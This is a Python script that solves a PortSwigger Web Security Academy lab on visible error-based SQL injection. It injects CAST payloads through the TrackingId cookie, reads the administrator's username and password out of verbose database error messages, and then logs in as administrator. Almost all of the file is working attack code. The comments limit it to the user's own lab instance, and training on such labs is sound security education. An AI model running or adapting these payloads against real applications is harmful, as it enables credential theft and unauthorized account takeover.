#!/usr/bin/env python3
"""
Lab 13: Visible error-based SQL injection
PortSwigger Web Security Academy:
https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based

Educational use only: run against your own PortSwigger lab instance.

Approach:
  1. Fetch a valid lab session and inspect the TrackingId cookie.
  2. Confirm that a quote causes a visible SQL error.
  3. Test a CAST-based error using a harmless integer.
  4. Cause the database to convert the first username to an integer and read it
     from the verbose error message.
  5. Cause the same error with the administrator password.
  6. Attempt to log in as administrator to verify the lab.

Unlike the previous conditional-response lab, this lab extracts data directly
from the database's verbose error message. The original TrackingId value is
intentionally omitted from injected requests to keep the payload short.
"""

import argparse
import re
import sys
import time
from urllib.parse import urlparse

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ANSI terminal colors
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
MAGENTA = "\033[95m"
BLUE = "\033[94m"
BOLD = "\033[1m"
DIM = "\033[2m"
RESET = "\033[0m"

REQUEST_COUNT = 0


def log(level, message, color=CYAN):
    timestamp = time.strftime("%H:%M:%S")
    print(f"{DIM}[{timestamp}]{RESET} {color}[{level}]{RESET} {message}")


def section(title):
    print(f"\n{MAGENTA}{BOLD}{'─' * 72}\n  {title}\n{'─' * 72}{RESET}")


def print_banner():
    print(f"""{CYAN}{BOLD}
╔══════════════════════════════════════════════════════════════════════╗
║        LAB 13 — VISIBLE ERROR-BASED SQL INJECTION                    ║
║        PortSwigger Web Security Academy                              ║
╚══════════════════════════════════════════════════════════════════════╝
{RESET}""")


def build_proxies(proxy):
    if not proxy:
        return {}
    proxy_url = proxy if "://" in proxy else f"http://{proxy}"
    return {"http": proxy_url, "https": proxy_url}


def safe_request(session, method, url, *, proxies, timeout, **kwargs):
    """Request wrapper with verbose request/response logging."""
    global REQUEST_COUNT
    REQUEST_COUNT += 1

    log("HTTP", f"Request #{REQUEST_COUNT}: {method.upper()} {url}", BLUE)
    if "cookies" in kwargs:
        cookie_names = list(kwargs["cookies"].keys())
        log("COOKIE", f"Cookie names sent: {', '.join(cookie_names)}", BLUE)
        tracking = kwargs["cookies"].get("TrackingId")
        if tracking is not None:
            log("PAYLOAD", f"TrackingId payload ({len(tracking)} chars): {tracking}", YELLOW)
    if "data" in kwargs:
        safe_data = dict(kwargs["data"])
        if "password" in safe_data:
            safe_data["password"] = "*" * min(len(str(safe_data["password"])), 12)
        log("FORM", f"POST fields: {safe_data}", BLUE)

    start = time.perf_counter()
    try:
        response = session.request(
            method, url, proxies=proxies, timeout=timeout,
            verify=False, allow_redirects=True, **kwargs
        )
    except requests.exceptions.Timeout:
        log("TIMEOUT", f"Request timed out after {timeout}s.", RED)
        raise
    except requests.exceptions.ConnectionError as exc:
        log("CONNECTION", f"Could not connect: {exc}", RED)
        raise
    except requests.exceptions.RequestException as exc:
        log("REQUEST", f"Request failed: {exc}", RED)
        raise

    elapsed = time.perf_counter() - start
    log("RESPONSE", f"HTTP {response.status_code} | {len(response.text)} chars | {elapsed:.3f}s",
        GREEN if response.ok else YELLOW)
    log("HEADERS", f"Content-Type: {response.headers.get('Content-Type', 'unknown')}", DIM)

    errors = find_error_messages(response.text)
    if errors:
        for error in errors[:3]:
            log("DB-ERROR", error[:500], RED)
    else:
        log("DB-ERROR", "No recognizable database error found in response.", DIM)

    return response


def find_error_messages(body):
    """Return short snippets that look like database errors."""
    patterns = [
        r"ERROR:\s*[^<\r\n]{1,300}",
        r"invalid input syntax for type integer[^<\r\n]{0,300}",
        r"more than one row returned by a subquery used as an expression",
        r"unterminated quoted string[^<\r\n]{0,200}",
        r"syntax error at or near[^<\r\n]{0,200}",
    ]
    found = []
    for pattern in patterns:
        for match in re.finditer(pattern, body, flags=re.IGNORECASE):
            snippet = re.sub(r"\s+", " ", match.group(0)).strip()
            if snippet not in found:
                found.append(snippet)
    return found


def extract_cast_value(body):
    """
    PostgreSQL-style CAST error commonly looks like:
    invalid input syntax for type integer: "administrator"
    Return the text inside the quoted value, if present.
    """
    patterns = [
        r'invalid input syntax for type integer:\s*"([^"]*)"',
        r'invalid input syntax for type integer:\s*&#34;([^&]*)&#34;',
    ]
    for pattern in patterns:
        match = re.search(pattern, body, flags=re.IGNORECASE)
        if match:
            return match.group(1)
    return None


def get_lab_session(base_url, proxies, timeout):
    section("STEP 1 — Fetch a valid lab session")
    session = requests.Session()
    response = safe_request(
        session, "GET", base_url, proxies=proxies, timeout=timeout
    )

    tracking_id = session.cookies.get("TrackingId")
    session_cookie = session.cookies.get("session")

    # Some servers expose cookies through the response cookie jar rather than
    # the session jar, so check that too.
    tracking_id = tracking_id or response.cookies.get("TrackingId")
    session_cookie = session_cookie or response.cookies.get("session")

    if not tracking_id:
        log("FAIL", "TrackingId cookie was not found. Is this the correct active lab URL?", RED)
        log("HINT", "Open the lab in your browser and copy its full https://....web-security-academy.net URL.", YELLOW)
        sys.exit(1)

    log("OK", f"TrackingId obtained ({len(tracking_id)} chars).", GREEN)
    log("INFO", f"Session cookie present: {'yes' if session_cookie else 'no'}", CYAN)
    log("NOTE", "Injected requests intentionally use a short TrackingId payload instead of the original value.", YELLOW)
    return session, tracking_id, session_cookie


def send_tracking_payload(base_url, session, payload, proxies, timeout):
    """Send payload as the whole TrackingId value to avoid cookie-length issues."""
    return safe_request(
        session, "GET", base_url, proxies=proxies, timeout=timeout,
        cookies={"TrackingId": payload},
    )


def verify_error_behavior(base_url, session, proxies, timeout):
    section("STEP 2 — Check whether verbose SQL errors are visible")

    log("INFO", "Sending a single-quote probe to test SQL string handling.")
    response = send_tracking_payload(base_url, session, "'", proxies, timeout)
    if find_error_messages(response.text):
        log("OK", "A likely database error is visible in the response.", GREEN)
    else:
        log("WARN", "No recognizable error found. The lab may be inactive or the error format may differ.", YELLOW)

    log("INFO", "Testing a CAST expression with a numeric value.")
    payload = "' AND 1=CAST((SELECT 1) AS int)--"
    response = send_tracking_payload(base_url, session, payload, proxies, timeout)
    value = extract_cast_value(response.text)
    if response.status_code < 500 and value is None:
        log("OK", "The numeric CAST probe did not reveal a text-conversion error.", GREEN)
    else:
        log("WARN", "The response differs from the expected clean numeric CAST; inspect the logged error.", YELLOW)


def leak_single_value(base_url, session, sql_expression, label, proxies, timeout):
    section(f"STEP — Extract {label} through the database error")

    # Empty the original TrackingId value to keep the injected cookie short.
    payload = f"' AND 1=CAST(({sql_expression}) AS int)--"
    log("SQL", f"Expression: {sql_expression}", YELLOW)
    log("WHY", "CAST(... AS int) asks the database to convert text into an integer.", CYAN)
    log("WHY", "If the selected text is not numeric, the database error may include that text.", CYAN)

    response = send_tracking_payload(base_url, session, payload, proxies, timeout)
    leaked = extract_cast_value(response.text)

    if leaked is not None:
        log("LEAK", f"{label} extracted ({len(leaked)} characters).", GREEN)
        if label.lower() == "username":
            log("VALUE", leaked, GREEN)
        else:
            log("VALUE", leaked, GREEN)
        return leaked

    log("FAIL", f"Could not parse {label} from the response.", RED)
    log("HINT", "Review the DB-ERROR lines above. The lab may use a slightly different error format.", YELLOW)
    return None


def login_as_administrator(base_url, password, proxies, timeout):
    section("STEP — Attempt administrator login")
    login_url = f"{base_url.rstrip('/')}/login"
    session = requests.Session()

    response = safe_request(session, "GET", login_url, proxies=proxies, timeout=timeout)
    csrf_match = re.search(
        r'name=["\']csrf["\']\s+value=["\']([^"\']+)["\']',
        response.text,
        flags=re.IGNORECASE,
    )
    csrf = csrf_match.group(1) if csrf_match else None
    log("CSRF", "Token found." if csrf else "No CSRF token detected in the expected format.",
        GREEN if csrf else YELLOW)

    form_data = {"username": "administrator", "password": password}
    if csrf:
        form_data["csrf"] = csrf

    response = safe_request(
        session, "POST", login_url, proxies=proxies, timeout=timeout,
        data=form_data,
    )

    if "Your username is: administrator" in response.text or "Log out" in response.text:
        log("SUCCESS", "Administrator login appears successful; check the lab banner for solved status.", GREEN)
    else:
        log("WARN", "Login was submitted, but success was not confirmed from the response.", YELLOW)
        log("HINT", "Check the lab page manually and verify the extracted password.", YELLOW)


def exploit(base_url, proxy=None, timeout=12):
    parsed = urlparse(base_url)
    if parsed.scheme not in ("http", "https") or not parsed.netloc:
        log("FAIL", "Please provide a full lab URL beginning with http:// or https://.", RED)
        sys.exit(2)

    proxies = build_proxies(proxy)
    log("TARGET", base_url, YELLOW)
    log("PROXY", proxy if proxy else "disabled", YELLOW)
    log("TIMEOUT", f"{timeout}s", YELLOW)
    log("SCOPE", "Use only against your own PortSwigger Academy lab.", YELLOW)

    session, original_tracking_id, session_cookie = get_lab_session(base_url, proxies, timeout)
    verify_error_behavior(base_url, session, proxies, timeout)

    username = leak_single_value(
        base_url, session,
        "SELECT username FROM users LIMIT 1",
        "username", proxies, timeout,
    )
    if username is None:
        log("STOP", "Username extraction failed; stopping rather than guessing.", RED)
        sys.exit(1)

    if username != "administrator":
        log("WARN", f"The first returned username is {username!r}, not 'administrator'. Continuing with the lab's documented LIMIT 1 query.", YELLOW)

    password = leak_single_value(
        base_url, session,
        "SELECT password FROM users LIMIT 1",
        "password", proxies, timeout,
    )
    if password is None:
        log("STOP", "Password extraction failed; stopping before login.", RED)
        sys.exit(1)

    log("INFO", "Password obtained. Submitting it to the lab login form.", CYAN)
    login_as_administrator(base_url, password, proxies, timeout)


def main():
    parser = argparse.ArgumentParser(
        description="Lab 12 — PortSwigger visible error-based SQL injection (verbose terminal logs)"
    )
    parser.add_argument("url", help="Full active PortSwigger lab URL")
    parser.add_argument("-p", "--proxy", metavar="HOST:PORT",
                        help="Optional proxy, e.g. 127.0.0.1:8080 (Burp Suite)")
    parser.add_argument("--timeout", type=int, default=12,
                        help="Request timeout in seconds (default: 12)")
    args = parser.parse_args()

    print_banner()
    try:
        exploit(args.url.rstrip("/"), proxy=args.proxy, timeout=args.timeout)
    except requests.exceptions.RequestException:
        log("FATAL", "A network request failed. Check the URL, lab status, proxy, and connectivity.", RED)
        sys.exit(1)
    except KeyboardInterrupt:
        print()
        log("STOP", "Interrupted by user.", YELLOW)
        sys.exit(130)


if __name__ == "__main__":
    main()
